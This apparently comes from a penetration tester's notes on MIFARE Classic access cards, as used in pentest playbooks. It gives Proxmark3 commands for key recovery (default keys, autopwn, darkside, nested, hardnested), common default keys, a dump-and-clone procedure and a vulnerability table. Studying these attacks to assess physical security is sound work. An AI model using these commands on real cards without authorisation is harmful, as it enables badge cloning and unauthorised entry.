---
tags: [pentest, wireless, rfid, mifare, nfc, cracking, both, initial-access]
tool: proxmark3
phase: 5
---
# MIFARE Classic Attack

MIFARE Classic (1K/4K) is the most widely deployed contactless smart card — and it's cryptographically broken. Multiple attacks exist to recover sector keys and dump/clone cards.

[[10 - Wireless/00 - README|Folder index]]

## Background

MIFARE Classic uses the proprietary Crypto-1 cipher with 48-bit keys. Multiple academic attacks have fully broken Crypto-1 since 2008.

## Attack methods (in order of preference)

### 1. Default keys

Many cards ship with default keys or have some sectors left on defaults.

```bash
[pm3] hf mf chk --1k    # check all sectors against known default keys
```

Common defaults: `FFFFFFFFFFFF`, `A0A1A2A3A4A5`, `D3F7D3F7D3F7`, `000000000000`

### 2. Autopwn (automated full recovery)

```bash
[pm3] hf mf autopwn
# Tries: default keys → darkside → nested → hardnested
# Dumps all sectors when done
```

### 3. Darkside attack (no known keys needed)

```bash
[pm3] hf mf darkside
# Exploits weak PRNG to recover one key from zero knowledge
# Only works on cards with weak PRNG (original MIFARE Classic)
```

### 4. Nested attack (one key known)

```bash
[pm3] hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF
# Uses one known key to recover all other keys
# Fast — seconds
```

### 5. Hardnested attack (one key known, strong PRNG)

```bash
[pm3] hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4 --ta
# For cards with fixed/strong PRNG (MIFARE Classic EV1)
# Slower — minutes
```

## Dump and clone

```bash
# Dump all sectors to file
[pm3] hf mf dump

# Write dump to a "magic" (Gen1a/Gen2) card
[pm3] hf mf cload -f hf-mf-XXXXXXXX-dump.bin

# Verify clone
[pm3] hf mf chk --1k
```

## Card types and vulnerability

| Card | Vulnerable | Notes |
| --- | --- | --- |
| MIFARE Classic 1K/4K (original) | Yes — all attacks work | Weak PRNG |
| MIFARE Classic EV1 | Yes — hardnested | Fixed PRNG, no darkside |
| MIFARE Plus (SL1) | Yes — runs in Classic mode | Can be upgraded to SL3 |
| MIFARE Plus (SL3) | No | AES-based, not Classic |
| MIFARE DESFire | No | Different technology entirely |

> [!warning] Physical security finding
> If a client uses MIFARE Classic for access control, this is a Critical finding. The card can be cloned in under a minute with a Proxmark3 or Flipper Zero.

## See also

- [[25 - Proxmark3]]
- [[26 - Flipper Zero Overview]]
- [[28 - HID Prox 125kHz]]
